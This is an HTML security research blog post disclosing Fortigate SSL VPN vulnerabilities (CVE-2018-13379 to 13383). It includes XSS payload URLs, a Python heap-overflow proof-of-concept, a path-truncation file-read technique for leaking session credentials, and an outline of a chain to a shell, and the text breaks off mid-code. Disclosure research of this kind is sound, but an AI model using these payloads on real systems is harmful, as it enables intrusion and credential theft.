&lt;p&gt;It seems like Fortinet and Pulse Secure are the most secure ones. Is that true? As a myth buster, we took on this challenge and started hacking Fortinet and Pulse Secure! This story is about hacking &lt;strong&gt;Fortigate SSL VPN&lt;/strong&gt;. The next article is going to be about &lt;strong&gt;Pulse Secure&lt;/strong&gt;, which is the most splendid one! Stay tuned!&lt;/p&gt;

&lt;h1 id=&quot;fortigate-ssl-vpn&quot;&gt;Fortigate SSL VPN&lt;/h1&gt;

&lt;p&gt;Fortinet calls their SSL VPN product line as Fortigate SSL VPN, which is prevalent among end users and medium-sized enterprise. There are more than 480k servers operating on the internet and is common in Asia and Europe. We can identify it from the URL &lt;code class=&quot;highlighter-rouge&quot;&gt;/remote/login&lt;/code&gt;. Here is the technical feature of Fortigate:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;All-in-one binary&lt;br /&gt;
  We started our research from the file system. We tried to list the binaries in &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/&lt;/code&gt; and found there are all symbolic links, pointing to &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/init&lt;/code&gt;. Just like this:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Fortigate compiles all the programs and configurations into a single binary, which makes the &lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt; really huge. It contains thousands of functions and there is no symbol! It only contains necessary programs for the SSL VPN, so the environment is really inconvenient for hackers. For example, there is even no &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/ls&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/cat&lt;/code&gt;!&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Web daemon&lt;br /&gt;
  There are 2 web interfaces running on the Fortigate. One is for the admin interface, handled with &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/httpsd&lt;/code&gt; on the port 443. The other is normal user interface, handled with &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sslvpnd&lt;/code&gt; on the port 4433 by default. Generally, the admin page should be restricted from the internet, so we can only access the user interface.&lt;/p&gt;

    &lt;p&gt;Through our investigation, we found the web server is modified from apache, but it is the apache from 2002. Apparently they modified apache in 2002 and added their own additional functionality. We can map the source code of apache to speed up our analysis.&lt;/p&gt;

    &lt;p&gt;In both web service, they also compiled their own apache modules into the binary to handle each URL path. We can find a table specifying the handlers and dig into them!&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;WebVPN&lt;br /&gt;
  WebVPN is a convenient proxy feature which allows us connect to all the services simply through a browser. It supports many protocols, like HTTP, FTP, RDP. It can also handle various web resources, such as WebSocket and Flash. To process a website correctly, it parses the HTML and rewrites all the URLs for us. This involves heavy string operation, which is prone to memory bugs.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;We found several vulnerabilities:&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13379-pre-auth-arbitrary-file-reading&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt;: Pre-auth arbitrary file reading&lt;/h3&gt;
&lt;p&gt;While fetching corresponding language file, it builds the json file path with the parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;lang&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/migadmin/lang/%s.json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;There is no protection, but a file extension appended automatically. It seems like we can only read json file. However, actually we can abuse the feature of &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt;. According to the man page, it writes &lt;strong&gt;at most size-1&lt;/strong&gt; into the output string. Therefore, we only need to make it exceed the buffer size and the &lt;code class=&quot;highlighter-rouge&quot;&gt;.json&lt;/code&gt; will be stripped. Then we can read whatever we want.&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13380-pre-auth-xss&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-383&quot;&gt;CVE-2018-13380&lt;/a&gt;: Pre-auth XSS&lt;/h3&gt;
&lt;p&gt;There are several XSS:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/message?title=x&amp;amp;msg=%26%23&amp;lt;svg/onload=alert(1)&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2018-13381-pre-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-387&quot;&gt;CVE-2018-13381&lt;/a&gt;: Pre-auth heap overflow&lt;/h3&gt;
&lt;p&gt;While encoding HTML entities code, there are 2 stages. The server first calculate the required buffer length for encoded string. Then it encode into the buffer. In the calculation stage, for example, encode string for &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt; and this should occupies 5 bytes. If it encounter anything starts with &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#&lt;/code&gt;, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, it consider there is a token already encoded, and count its length directly. Like this:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;(&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;)&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;#&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;lt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;amp;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;#&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, there is an inconsistency between length calculation and encoding process. The encode part does not handle that much.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;#60;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we input a malicious string like &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#&amp;lt;&amp;lt;&amp;lt;;&lt;/code&gt;, the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is still encoded into &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, so the result should be &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#&amp;amp;#60;&amp;amp;#60;&amp;amp;#60;;&lt;/code&gt;! This is much longer than the expected length 6 bytes, so it leads to a heap overflow.&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;title&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;x&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&amp;amp;#&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;https://sslvpn:4433/message&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2018-13382-the-magic-backdoor&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-389&quot;&gt;CVE-2018-13382&lt;/a&gt;: The magic backdoor&lt;/h3&gt;
&lt;p&gt;In the login page, we found a special parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;magic&lt;/code&gt;. Once the parameter meets a hardcoded string, we can modify any userâ€™s password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;According to our survey, there are still plenty of Fortigate SSL VPN lack of patch. Therefore, considering its severity, we will not disclose the magic string. However, this vulnerability has been &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240&quot;&gt;reproduced by the researcher from CodeWhite&lt;/a&gt;. It is surely that other attackers will exploit this vulnerability soon! Please update your Fortigate ASAP!&lt;/p&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;zh-tw&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Critical vulns in &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; reversed &amp;amp; exploited by our colleagues &lt;a href=&quot;https://twitter.com/niph_?ref_src=twsrc%5Etfw&quot;&gt;@niph_&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/ramoliks?ref_src=twsrc%5Etfw&quot;&gt;@ramoliks&lt;/a&gt; - patch your &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; asap and see the &lt;a href=&quot;https://twitter.com/hashtag/bh2019?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#bh2019&lt;/a&gt; talk of &lt;a href=&quot;https://twitter.com/orange_8361?ref_src=twsrc%5Etfw&quot;&gt;@orange_8361&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/mehqq_?ref_src=twsrc%5Etfw&quot;&gt;@mehqq_&lt;/a&gt; for details (tnx guys for the teaser that got us started) &lt;a href=&quot;https://t.co/TLLEbXKnJ4&quot;&gt;pic.twitter.com/TLLEbXKnJ4&lt;/a&gt;&lt;/p&gt;&amp;mdash; Code White GmbH (@codewhitesec) &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240?ref_src=twsrc%5Etfw&quot;&gt;2019å¹´7æœˆ2æ—¥&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;cve-2018-13383-post-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-388&quot;&gt;CVE-2018-13383&lt;/a&gt;: Post-auth heap overflow&lt;/h3&gt;

&lt;p&gt;This is a vulnerability on the WebVPN feature. While parsing JavaScript in the HTML, it tries to copy content into a buffer with the following code:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The buffer size is fixed to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2000&lt;/code&gt;, but the input string is unlimited. Therefore, here is a heap overflow. It is worth to note that this vulnerability can overflow Null byte, which is useful in our exploitation.&lt;br /&gt;
To trigger this overflow, we need to put our exploit on an HTTP server, and then ask the SSL VPN to proxy our exploit as a normal user.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;The official advisory described no RCE risk at first. Actually, it was a misunderstanding. We will show you how to exploit from the user login interface without authentication.&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13381&quot;&gt;CVE-2018-13381&lt;/h3&gt;
&lt;p&gt;Our first attempt is exploiting the pre-auth heap overflow. However, there is a fundamental defect of this vulnerability â€“ It does not overflow Null bytes. In general, this is not a serious problem. The heap exploitation techniques nowadays should overcome this. However, we found it a disaster doing heap feng shui on Fortigate. There are several obstacles, making the heap unstable and hard to be controlled.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Single thread, single process, single allocator&lt;br /&gt;
  The web daemon handles multiple connection with &lt;code class=&quot;highlighter-rouge&quot;&gt;epoll()&lt;/code&gt;, no multi-process or multi-thread, and the main process and libraries use the same heap, called JeMalloc. It means, all the memory allocations from all the operations of all the connections are on the same heap. Therefore, the heap is really messy.&lt;/li&gt;
  &lt;li&gt;Operations regularly triggered&lt;br /&gt;
  This interferes the heap but is uncontrollable. We cannot arrange the heap carefully because it would be destroyed.&lt;/li&gt;
  &lt;li&gt;Apache additional memory management. &lt;br /&gt;
  The memory wonâ€™t be &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt; until the connection ends. We cannot arrange the heap in a single connection. Actually this can be an effective mitigation for heap vulnerabilities especially for use-after-free.&lt;/li&gt;
  &lt;li&gt;JeMalloc&lt;br /&gt;
  JeMalloc isolates meta data and user data, so it is hard to modify meta data and play with the heap management. Moreover, it centralizes small objects, which also limits our exploit.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We were stuck here, and then we chose to try another way. If anyone exploits this successfully, please teach us!&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13379--cve-2018-13383&quot;&gt;CVE-2018-13379 + CVE-2018-13383&lt;/h3&gt;
&lt;p&gt;This is a combination of pre-auth file reading and post-auth heap overflow. One for gaining authentication and one for getting a shell.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Gain authentication&lt;br /&gt;
  We first use CVE-2018-13379 to leak the session file. The session file contains valuable information, such as username and plaintext password, which let us login easily.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Get the shell&lt;br /&gt;
  After login, we can ask the SSL VPN to proxy the exploit on our malicious HTTP server, and then trigger the heap overflow.&lt;/p&gt;

    &lt;p&gt;Due to the problems mentioned above, we need a nice target to overflow. We cannot control the heap carefully, but maybe we can find something &lt;strong&gt;regularly&lt;/strong&gt; appears! It would be great if it is &lt;strong&gt;everywhere&lt;/strong&gt;, and every time we trigger the bug, we can overflow it easily! However, it is a hard work to find such a target from this huge program, so we were stuck at that time â€¦ and we started to fuzz the server, trying to get something useful.&lt;/p&gt;

    &lt;p&gt;We got an interesting crash. To our great surprise, we almost control the program counter!&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Here is the crash, and thatâ€™s why we love fuzzing! ;)&lt;/p&gt;
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Program received signal SIGSEGV, Segmentation fault.
  0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-x86_64/lib/libssl.so.1.1
  2: /x $rax = 0x41414141
  1: x/i $pc
  =&amp;gt; 0x7fb908d12a77 &amp;lt;SSL_do_handshake+23&amp;gt;: callq *0x60(%rax)
  (gdb)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;The crash happened in &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_lib.c#L3716&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SSL_do_handshake()&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SSL_do_handshake&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

      &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssl_renegotiate_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL_in_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_in_before&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_MODE_ASYNC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ASYNC_get_current_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_async_args&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

